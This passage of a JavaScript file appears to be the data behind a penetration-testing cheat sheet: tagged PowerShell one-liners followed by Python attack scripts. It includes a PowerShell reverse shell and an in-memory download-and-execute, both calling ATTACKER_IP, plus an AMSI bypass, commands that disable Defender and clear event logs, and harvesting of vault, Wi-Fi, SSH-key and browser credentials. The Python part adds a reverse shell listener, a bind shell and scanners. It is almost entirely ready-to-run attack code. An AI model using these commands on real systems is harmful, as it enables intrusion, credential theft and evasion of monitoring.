  { desc: "Check service failure recovery options", cmd: "Get-CimInstance Win32_Service | ForEach-Object { $r=sc.exe qfailure $_.Name 2>$null; if($r -match 'RUN PROCESS'){$_.Name} }" },
  { desc: "List stopped services configured to auto-start", cmd: "Get-Service | Where-Object {$_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'} | Select-Object Name,DisplayName" },
  { desc: "Enumerate COM objects for hijacking", cmd: "Get-ChildItem 'HKLM:\\SOFTWARE\\Classes\\CLSID' -ErrorAction SilentlyContinue | ForEach-Object { $ip = (Get-ItemProperty \"$($_.PSPath)\\InprocServer32\" -ErrorAction SilentlyContinue).'(Default)'; if($ip -and !(Test-Path $ip)){[pscustomobject]@{CLSID=$_.PSChildName;Missing=$ip}} }" },

  // ========== NETWORK (16) ==========
  { desc: "TCP port scan (single host, top ports)", cmd: "1..1024 | ForEach-Object { $t=New-Object Net.Sockets.TcpClient; if($t.ConnectAsync('TARGET',$_).Wait(100)){\"Port $_ open\"}; $t.Dispose() }" },
  { desc: "Enumerate active TCP connections", cmd: "Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess" },
  { desc: "Enumerate listening ports", cmd: "Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess | Sort-Object LocalPort" },
  { desc: "DNS enumeration - resolve multiple hosts", cmd: "Get-Content hosts.txt | ForEach-Object { Resolve-DnsName $_ -ErrorAction SilentlyContinue | Select-Object Name,IPAddress }" },
  { desc: "Reverse DNS lookup on subnet", cmd: "1..254 | ForEach-Object { Resolve-DnsName \"192.168.1.$_\" -ErrorAction SilentlyContinue | Select-Object NameHost,IPAddress }" },
  { desc: "Show ARP table", cmd: "Get-NetNeighbor | Where-Object {$_.State -ne 'Unreachable'} | Select-Object IPAddress,LinkLayerAddress,State,InterfaceAlias" },
  { desc: "Enumerate firewall rules", cmd: "Get-NetFirewallRule -Enabled True | Select-Object Name,Direction,Action,Profile | Format-Table -AutoSize" },
  { desc: "Enumerate firewall rules with port details", cmd: "Get-NetFirewallRule -Enabled True | Get-NetFirewallPortFilter | Select-Object InstanceID,Protocol,LocalPort,RemotePort" },
  { desc: "Check proxy settings", cmd: "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' | Select-Object ProxyServer,ProxyEnable,AutoConfigURL" },
  { desc: "Enumerate SMB shares on remote host", cmd: "Get-SmbShare -CimSession TARGET -ErrorAction SilentlyContinue | Select-Object Name,Path,Description" },
  { desc: "List all network adapters with IPs", cmd: "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Select-Object InterfaceAlias,IPAddress,PrefixLength" },
  { desc: "PowerShell reverse shell", cmd: "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}" },
  { desc: "Test connectivity to multiple ports", cmd: "@(80,443,445,3389,5985) | ForEach-Object { $r=Test-NetConnection -ComputerName TARGET -Port $_ -WarningAction SilentlyContinue; [pscustomobject]@{Port=$_;Open=$r.TcpTestSucceeded} }" },
  { desc: "Get Wi-Fi profiles and passwords", cmd: "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $p=($_ -split ':')[1].Trim(); $k=(netsh wlan show profile name=$p key=clear | Select-String 'Key Content'); [pscustomobject]@{Profile=$p;Key=$k} }" },
  { desc: "Enumerate DNS cache", cmd: "Get-DnsClientCache | Select-Object Entry,RecordName,Data" },
  { desc: "Enumerate routing table", cmd: "Get-NetRoute | Select-Object DestinationPrefix,NextHop,InterfaceAlias,RouteMetric | Format-Table -AutoSize" },

  // ========== FILE OPERATIONS (12) ==========
  { desc: "Search for files with passwords in name", cmd: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include '*password*','*credential*','*cred*' | Select-Object FullName,LastWriteTime" },
  { desc: "Find sensitive config files", cmd: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include 'web.config','appsettings.json','*.config','*.xml' | Select-String -Pattern 'password|connectionString|apikey' -List | Select-Object Path" },
  { desc: "Enumerate alternate data streams", cmd: "Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue | Where-Object {$_.Stream -ne ':$DATA'} }" },
  { desc: "Verify file hashes", cmd: "Get-FileHash -Path FILE -Algorithm SHA256 | Select-Object Hash,Path" },
  { desc: "Find large files (over 100MB)", cmd: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -gt 100MB} | Select-Object FullName,@{N='SizeMB';E={[math]::Round($_.Length/1MB,2)}} | Sort-Object SizeMB -Descending" },
  { desc: "Find recently modified files (last 24 hours)", cmd: "Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} | Select-Object FullName,LastWriteTime | Sort-Object LastWriteTime -Descending" },
  { desc: "Download file from URL", cmd: "Invoke-WebRequest -Uri 'http://ATTACKER_IP/file.exe' -OutFile 'C:\\Temp\\file.exe'" },
  { desc: "Download and execute in memory", cmd: "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')" },
  { desc: "File transfer via Base64 encoding", cmd: "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\path\\file.exe')); $b | Out-File encoded.txt" },
  { desc: "Search for KeePass databases", cmd: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue -Include '*.kdbx','*.kdb' | Select-Object FullName,LastWriteTime" },
  { desc: "Find SSH keys on Windows", cmd: "Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue -Include 'id_rsa','id_dsa','id_ecdsa','id_ed25519','*.ppk' | Select-Object FullName" },
  { desc: "Search file contents for credit card patterns", cmd: "Get-ChildItem -Path C:\\Users -Recurse -Include '*.txt','*.csv','*.log' -ErrorAction SilentlyContinue | Select-String -Pattern '\\b\\d{4}[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4}\\b' | Select-Object Path,LineNumber,Line" },

  // ========== DEFENSE EVASION (16) ==========
  { desc: "Check if AMSI is loaded", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | Select-Object Name,IsPublic" },
  { desc: "AMSI bypass via reflection (basic)", cmd: "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)" },
  { desc: "Check PowerShell execution policy", cmd: "Get-ExecutionPolicy -List" },
  { desc: "Bypass execution policy for current process", cmd: "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass" },
  { desc: "Check if constrained language mode is active", cmd: "$ExecutionContext.SessionState.LanguageMode" },
  { desc: "Check ScriptBlock logging status", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -ErrorAction SilentlyContinue" },
  { desc: "Check Module logging status", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' -ErrorAction SilentlyContinue" },
  { desc: "Check Transcription logging status", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -ErrorAction SilentlyContinue" },
  { desc: "Enumerate Windows Defender exclusions", cmd: "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath; Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess; Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension" },
  { desc: "Check Windows Defender status", cmd: "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled" },
  { desc: "List installed AV products", cmd: "Get-CimInstance -Namespace root\\SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState,pathToSignedProductExe" },
  { desc: "Clear Windows event logs", cmd: "Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log -ErrorAction SilentlyContinue }" },
  { desc: "Check ETW providers for logging", cmd: "logman query providers | Select-String 'Microsoft-Windows-PowerShell|Microsoft-Antimalware'" },
  { desc: "Disable Windows Defender real-time monitoring (requires admin)", cmd: "Set-MpPreference -DisableRealtimeMonitoring $true" },
  { desc: "Check AppLocker policy", cmd: "Get-AppLockerPolicy -Effective -Xml | Select-Xml -XPath '//RuleCollection' | ForEach-Object { $_.Node.OuterXml }" },
  { desc: "Find writable directories in PATH for DLL planting", cmd: "$env:PATH -split ';' | ForEach-Object { $p=$_; try { $acl=Get-Acl $p; $acl.Access | Where-Object {$_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match 'Users|Everyone'} | ForEach-Object { [pscustomobject]@{Path=$p;Identity=$_.IdentityReference;Rights=$_.FileSystemRights} } } catch {} }" },

  // ========== CREDENTIAL ACCESS (12) ==========
  { desc: "Check if SAM file is accessible", cmd: "Test-Path C:\\Windows\\System32\\config\\SAM; Get-Acl C:\\Windows\\System32\\config\\SAM | Select-Object -ExpandProperty Access" },
  { desc: "Enumerate Credential Manager entries", cmd: "cmdkey /list" },
  { desc: "Enumerate Windows Vault credentials", cmd: "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ } | Select-Object Resource,UserName,Password" },
  { desc: "Find cached credentials in registry", cmd: "Get-ItemProperty 'HKLM:\\SECURITY\\Cache' -ErrorAction SilentlyContinue" },
  { desc: "Extract DPAPI master key locations", cmd: "Get-ChildItem \"$env:APPDATA\\Microsoft\\Protect\" -Recurse -Force -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime" },
  { desc: "Find browser credential databases (Chrome)", cmd: "Get-ChildItem \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\" -Recurse -Include 'Login Data','Cookies','History' -ErrorAction SilentlyContinue | Select-Object FullName" },
  { desc: "Find browser credential databases (Firefox)", cmd: "Get-ChildItem \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\" -Recurse -Include 'logins.json','key4.db','cert9.db' -ErrorAction SilentlyContinue | Select-Object FullName" },
  { desc: "Extract saved Wi-Fi passwords", cmd: "(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $name=($_ -split ':')[1].Trim(); $detail=netsh wlan show profile name=\"$name\" key=clear; $pass=($detail | Select-String 'Key Content' | ForEach-Object {($_ -split ':')[1].Trim()}); [pscustomobject]@{SSID=$name;Password=$pass} }" },
  { desc: "Check for Group Policy Preferences passwords (cpassword)", cmd: "Get-ChildItem -Path '\\\\DOMAIN\\SYSVOL' -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -ErrorAction SilentlyContinue | Select-String 'cpassword' | Select-Object Path,Line" },
  { desc: "Check for unattend.xml credentials", cmd: "Get-ChildItem -Path C:\\ -Recurse -Include 'unattend.xml','sysprep.xml','unattend.inf' -ErrorAction SilentlyContinue | Select-String -Pattern 'Password' -Context 0,2" },
  { desc: "Enumerate LSA protection status", cmd: "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' | Select-Object RunAsPPL,LimitBlankPasswordUse,RestrictAnonymous" },
  { desc: "Check WDigest credential caching", cmd: "Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -ErrorAction SilentlyContinue" },

  // ========== SYSTEM INFO (16) ==========
  { desc: "Full system information", cmd: "Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture,LastBootUpTime" },
  { desc: "Enumerate installed hotfixes", cmd: "Get-HotFix | Select-Object HotFixID,Description,InstalledOn | Sort-Object InstalledOn -Descending" },
  { desc: "List installed software (32-bit and 64-bit)", cmd: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*','HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName" },
  { desc: "Enumerate environment variables", cmd: "[Environment]::GetEnvironmentVariables('Machine') | Format-Table -AutoSize" },
  { desc: "PATH analysis for writable directories", cmd: "$env:PATH -split ';' | ForEach-Object { [pscustomobject]@{Path=$_;Exists=(Test-Path $_);Writable=$(try{[IO.File]::Create((Join-Path $_ 'test.tmp'),[IO.FileMode]::CreateNew).Dispose();Remove-Item (Join-Path $_ 'test.tmp');$true}catch{$false})} }" },
  { desc: "Check current user privileges", cmd: "whoami /priv" },
  { desc: "Check current user group memberships", cmd: "whoami /groups" },
  { desc: "Enumerate access tokens", cmd: "whoami /all" },
  { desc: "Check if running as admin", cmd: "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" },
  { desc: "Enumerate loaded drivers", cmd: "Get-CimInstance Win32_SystemDriver | Where-Object {$_.State -eq 'Running'} | Select-Object Name,DisplayName,PathName,State" },
  { desc: "List loaded DLLs in current process", cmd: "[System.Diagnostics.Process]::GetCurrentProcess().Modules | Select-Object ModuleName,FileName,ModuleMemorySize | Sort-Object ModuleName" },
  { desc: "Enumerate local users", cmd: "Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordRequired,PasswordLastSet" },
  { desc: "Enumerate local groups and members", cmd: "Get-LocalGroup | ForEach-Object { $g=$_.Name; Get-LocalGroupMember $g -ErrorAction SilentlyContinue | ForEach-Object { [pscustomobject]@{Group=$g;Member=$_.Name;Type=$_.ObjectClass} } }" },
  { desc: "Check BitLocker status", cmd: "Get-BitLockerVolume | Select-Object MountPoint,VolumeStatus,EncryptionPercentage,ProtectionStatus" },
  { desc: "Enumerate shared folders", cmd: "Get-SmbShare | Select-Object Name,Path,Description | Format-Table -AutoSize" },
  { desc: "Check Windows feature installation state", cmd: "Get-WindowsOptionalFeature -Online | Where-Object {$_.State -eq 'Enabled'} | Select-Object FeatureName | Sort-Object FeatureName" },
];

const PYTHON_SNIPPETS = [
  // ============================================================
  // SOCKET PROGRAMMING
  // ============================================================
  {
    name: "TCP Port Scanner (Simple)",
    desc: "Scan a range of TCP ports on a target host using basic socket connections.",
    code: `import socket
import sys

def tcp_scan(target, start_port, end_port):
    print(f"Scanning {target} ports {start_port}-{end_port}")
    open_ports = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is open")
            open_ports.append(port)
        sock.close()
    return open_ports

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    results = tcp_scan(target, 1, 1024)
    print(f"\\nOpen ports: {results}")`
  },
  {
    name: "TCP Port Scanner (Threaded)",
    desc: "Multi-threaded TCP port scanner for faster enumeration using concurrent.futures.",
    code: `import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            return port
    except socket.error:
        pass
    return None

def threaded_scan(target, start_port, end_port, max_threads=100):
    open_ports = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(scan_port, target, port): port
            for port in range(start_port, end_port + 1)
        }
        for future in as_completed(futures):
            result = future.result()
            if result is not None:
                print(f"[+] Port {result} is open")
                open_ports.append(result)
    return sorted(open_ports)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    results = threaded_scan(target, 1, 65535, max_threads=200)
    print(f"\\nFound {len(results)} open ports: {results}")`
  },
  {
    name: "UDP Port Scanner",
    desc: "Scan UDP ports by sending empty datagrams and checking for ICMP unreachable responses.",
    code: `import socket
import sys

def udp_scan(target, ports):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(b"\\x00", (target, port))
            try:
                data, addr = sock.recvfrom(1024)
                print(f"[+] Port {port} is open (received response)")
                open_ports.append(port)
            except socket.timeout:
                print(f"[?] Port {port} is open|filtered (no response)")
                open_ports.append(port)
        except socket.error as e:
            print(f"[-] Port {port} is closed: {e}")
        finally:
            sock.close()
    return open_ports

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    common_udp = [53, 67, 68, 69, 123, 137, 138, 161, 162, 500, 514, 1900]
    results = udp_scan(target, common_udp)
    print(f"\\nOpen/filtered UDP ports: {results}")`
  },
  {
    name: "Banner Grabbing",
    desc: "Connect to open ports and retrieve service banners for version identification.",
    code: `import socket
import sys

def grab_banner(target, port, timeout=3):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        # Send a generic probe for services that wait for client input
        probes = [
            b"\\r\\n",
            b"HEAD / HTTP/1.0\\r\\n\\r\\n",
            b"EHLO test\\r\\n",
        ]
        # First try to receive without sending
        try:
            banner = sock.recv(1024)
            if banner:
                return banner.decode("utf-8", errors="replace").strip()
        except socket.timeout:
            pass
        # Try each probe
        for probe in probes:
            try:
                sock.send(probe)
                banner = sock.recv(1024)
                if banner:
                    return banner.decode("utf-8", errors="replace").strip()
            except (socket.timeout, socket.error):
                continue
        sock.close()
    except socket.error as e:
        return f"Error: {e}"
    return "No banner received"

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    ports = [21, 22, 25, 80, 110, 143, 443, 3306, 8080]
    for port in ports:
        banner = grab_banner(target, port)
        if banner and not banner.startswith("Error"):
            print(f"[+] {target}:{port} -- {banner[:120]}")`
  },
  {
    name: "Reverse Shell Listener",
    desc: "Listen for incoming reverse shell connections and provide an interactive command interface.",
    code: `import socket
import sys
import threading

def listener(bind_ip, bind_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(1)
    print(f"[*] Listening on {bind_ip}:{bind_port}")
    client_socket, addr = server.accept()
    print(f"[+] Connection received from {addr[0]}:{addr[1]}")

    def recv_thread(sock):
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    print("\\n[!] Connection closed by remote host")
                    break
                sys.stdout.write(data.decode("utf-8", errors="replace"))
                sys.stdout.flush()
            except Exception:
                break

    t = threading.Thread(target=recv_thread, args=(client_socket,), daemon=True)
    t.start()

    try:
        while True:
            cmd = input()
            if cmd.lower() == "exit":
                break
            client_socket.send((cmd + "\\n").encode())
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        client_socket.close()
        server.close()
        print("[*] Listener closed")

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    listener(ip, port)`
  },
  {
    name: "Bind Shell",
    desc: "Bind a shell to a port, allowing remote command execution upon connection.",
    code: `import socket
import subprocess
import sys
import threading

def handle_client(client_socket):
    while True:
        try:
            client_socket.send(b"shell> ")
            data = client_socket.recv(4096).decode("utf-8").strip()
            if not data:
                break
            if data.lower() in ("exit", "quit"):
                client_socket.send(b"Goodbye\\n")
                break
            try:
                output = subprocess.check_output(
                    data, shell=True, stderr=subprocess.STDOUT, timeout=30
                )
                client_socket.send(output)
            except subprocess.CalledProcessError as e:
                client_socket.send(e.output)
            except subprocess.TimeoutExpired:
                client_socket.send(b"Command timed out\\n")
        except Exception:
            break
    client_socket.close()

def bind_shell(bind_ip, bind_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    print(f"[*] Bind shell listening on {bind_ip}:{bind_port}")
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        t = threading.Thread(target=handle_client, args=(client,))
        t.start()

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    bind_shell(ip, port)`
  },
  {
    name: "Raw Socket Sniffer",
    desc: "Capture and parse raw network packets using raw sockets (requires root privileges).",
    code: `import socket
import struct
import sys

def parse_ethernet(data):
    dest, src, proto = struct.unpack("!6s6s H", data[:14])
    dest_mac = ":".join(f"{b:02x}" for b in dest)
    src_mac = ":".join(f"{b:02x}" for b in src)
    return dest_mac, src_mac, proto, data[14:]

def parse_ipv4(data):
    version_ihl = data[0]
    ihl = (version_ihl & 0xF) * 4
    ttl, proto, src, dest = struct.unpack("!8x B B 2x 4s 4s", data[:20])
    src_ip = socket.inet_ntoa(src)
    dest_ip = socket.inet_ntoa(dest)
    return ttl, proto, src_ip, dest_ip, data[ihl:]

def parse_tcp(data):
    src_port, dest_port, seq, ack, offset_flags = struct.unpack("!HHLLH", data[:14])
    offset = (offset_flags >> 12) * 4
    flags = offset_flags & 0x3F
    flag_str = ""
    if flags & 0x01: flag_str += "FIN "
    if flags & 0x02: flag_str += "SYN "
    if flags & 0x04: flag_str += "RST "
    if flags & 0x08: flag_str += "PSH "
    if flags & 0x10: flag_str += "ACK "
    if flags & 0x20: flag_str += "URG "
    return src_port, dest_port, seq, ack, flag_str.strip(), data[offset:]

def sniff(count=100):
    try:
        raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    except PermissionError:
        print("[!] Raw sockets require root privileges")
        sys.exit(1)

    print(f"[*] Sniffing {count} packets...")
    for i in range(count):
        raw_data, addr = raw_sock.recvfrom(65535)
        dest_mac, src_mac, eth_proto, payload = parse_ethernet(raw_data)
        if eth_proto == 0x0800:  # IPv4
            ttl, proto, src_ip, dest_ip, ip_payload = parse_ipv4(payload)
            if proto == 6:  # TCP
                src_port, dest_port, seq, ack, flags, tcp_data = parse_tcp(ip_payload)
                print(f"[{i+1}] TCP {src_ip}:{src_port} -> {dest_ip}:{dest_port} [{flags}] TTL={ttl}")
            elif proto == 17:  # UDP
                src_port, dest_port = struct.unpack("!HH", ip_payload[:4])
                print(f"[{i+1}] UDP {src_ip}:{src_port} -> {dest_ip}:{dest_port} TTL={ttl}")
            elif proto == 1:  # ICMP
                print(f"[{i+1}] ICMP {src_ip} -> {dest_ip} TTL={ttl}")
    raw_sock.close()

if __name__ == "__main__":
    sniff()`
  },
  {
    name: "SYN Scanner with Scapy",
    desc: "Perform a TCP SYN (half-open) scan using Scapy for stealthy port scanning.",
    code: `from scapy.all import sr1, IP, TCP, conf
import sys

conf.verb = 0

def syn_scan(target, ports):
    open_ports = []
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=2)
        if resp is not None:
            if resp.haslayer(TCP):
                if resp[TCP].flags == 0x12:  # SYN-ACK
                    print(f"[+] Port {port} is open")
                    open_ports.append(port)
                    # Send RST to close the connection
                    rst = IP(dst=target) / TCP(dport=port, flags="R")
                    sr1(rst, timeout=1)
                elif resp[TCP].flags == 0x14:  # RST-ACK
                    pass  # Port is closed
        else:
            print(f"[?] Port {port} is filtered (no response)")
    return open_ports

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
    print(f"[*] SYN scanning {target}")
    results = syn_scan(target, common_ports)
    print(f"\\n[*] Open ports: {results}")`
  },
  {
    name: "DNS Resolver",
    desc: "Resolve DNS records (A, AAAA, MX, NS, TXT, CNAME) for a given domain.",
    code: `import dns.resolver
import sys

def resolve_dns(domain):
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    results = {}
    for rtype in record_types:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            records = []
            for rdata in answers:
                if rtype == "MX":
                    records.append(f"{rdata.preference} {rdata.exchange}")
                elif rtype == "SOA":
                    records.append(f"ns={rdata.mname} email={rdata.rname} serial={rdata.serial}")
                else:
                    records.append(str(rdata))
            results[rtype] = records
            print(f"\\n[{rtype} Records]")
            for r in records:
                print(f"  {r}")
        except dns.resolver.NoAnswer:
            pass
        except dns.resolver.NXDOMAIN:
            print(f"[!] Domain {domain} does not exist")
            return {}
        except dns.resolver.NoNameservers:
            pass
        except Exception as e:
            pass
    return results

def reverse_dns(ip):
    try:
        addr = dns.reversename.from_address(ip)
        answers = dns.resolver.resolve(addr, "PTR")
        for rdata in answers:
            print(f"[PTR] {ip} -> {rdata}")
    except Exception as e:
        print(f"[!] Reverse DNS failed for {ip}: {e}")

if __name__ == "__main__":
    domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    print(f"[*] DNS Resolution for {domain}")
    resolve_dns(domain)`
  },

  // ============================================================
  // WEB REQUESTS
  // ============================================================
  {
    name: "HTTP GET/POST Requests",
    desc: "Perform HTTP GET and POST requests with custom headers, parameters, and error handling.",
    code: `import requests
import json
import sys

def http_get(url, params=None, headers=None):
    try:
        resp = requests.get(url, params=params, headers=headers, timeout=10, verify=True)
        print(f"[GET] {resp.url}")
        print(f"  Status: {resp.status_code}")
        print(f"  Content-Type: {resp.headers.get('Content-Type', 'unknown')}")
        print(f"  Size: {len(resp.content)} bytes")
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[!] GET failed: {e}")
        return None

def http_post(url, data=None, json_data=None, headers=None):
    try:
        resp = requests.post(url, data=data, json=json_data, headers=headers, timeout=10)
        print(f"[POST] {resp.url}")
        print(f"  Status: {resp.status_code}")
        try:
            print(f"  Response: {json.dumps(resp.json(), indent=2)[:500]}")
        except ValueError:
            print(f"  Response: {resp.text[:500]}")
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[!] POST failed: {e}")
        return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "https://httpbin.org/get"
    headers = {"User-Agent": "SecurityScanner/1.0"}
    resp = http_get(url, params={"test": "value"}, headers=headers)
    if resp:
        print(f"\\n  Headers received:")
        for k, v in resp.headers.items():
            print(f"    {k}: {v}")`
  },
  {
    name: "Web Directory Brute-Forcer",
    desc: "Brute-force web directories and files using a wordlist with threading support.",
    code: `import requests
import sys
import threading
from queue import Queue
from urllib.parse import urljoin

def dir_brute(target_url, wordlist_path, extensions=None, threads=10):
    if extensions is None:
        extensions = ["", ".php", ".html", ".txt", ".bak", ".old", ".conf"]

    found = []
    q = Queue()

    with open(wordlist_path, "r") as f:
        for line in f:
            word = line.strip()
            if not word or word.startswith("#"):
                continue
            for ext in extensions:
                q.put(word + ext)

    total = q.qsize()
    print(f"[*] Brute-forcing {target_url} with {total} paths using {threads} threads")

    def worker():
        while not q.empty():
            path = q.get()
            url = urljoin(target_url, path)
            try:
                resp = requests.get(url, timeout=5, allow_redirects=False)
                if resp.status_code not in [404, 400, 500]:
                    size = len(resp.content)
                    print(f"[{resp.status_code}] {url} ({size} bytes)")
                    found.append({"url": url, "status": resp.status_code, "size": size})
            except requests.exceptions.RequestException:
                pass
            finally:
                q.task_done()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    q.join()
    print(f"\\n[*] Found {len(found)} accessible paths")
    return found

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/"
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/wordlists/dirb/common.txt"
    dir_brute(target, wordlist)`
  },
  {
    name: "Subdomain Enumerator",
    desc: "Enumerate subdomains of a target domain using a wordlist and DNS resolution.",
    code: `import dns.resolver
import sys
import threading
from queue import Queue

def enumerate_subdomains(domain, wordlist_path, threads=20):
    found = []
    q = Queue()

    with open(wordlist_path, "r") as f:
        for line in f:
            word = line.strip()
            if word and not word.startswith("#"):
                q.put(word)

    print(f"[*] Enumerating subdomains of {domain} ({q.qsize()} candidates)")

    def worker():
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 3
        while not q.empty():
            subdomain = q.get()
            fqdn = f"{subdomain}.{domain}"
            try:
                answers = resolver.resolve(fqdn, "A")
                ips = [str(rdata) for rdata in answers]
                print(f"[+] {fqdn} -> {', '.join(ips)}")
                found.append({"subdomain": fqdn, "ips": ips})
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                    dns.resolver.NoNameservers, dns.exception.Timeout):
                pass
            finally:
                q.task_done()

    thread_list = []
    for _ in range(min(threads, q.qsize())):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)

    q.join()
    print(f"\\n[*] Found {len(found)} subdomains")
    return found

if __name__ == "__main__":
    domain = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    wordlist = sys.argv[2] if len(sys.argv) > 2 else "/usr/share/wordlists/subdomains.txt"
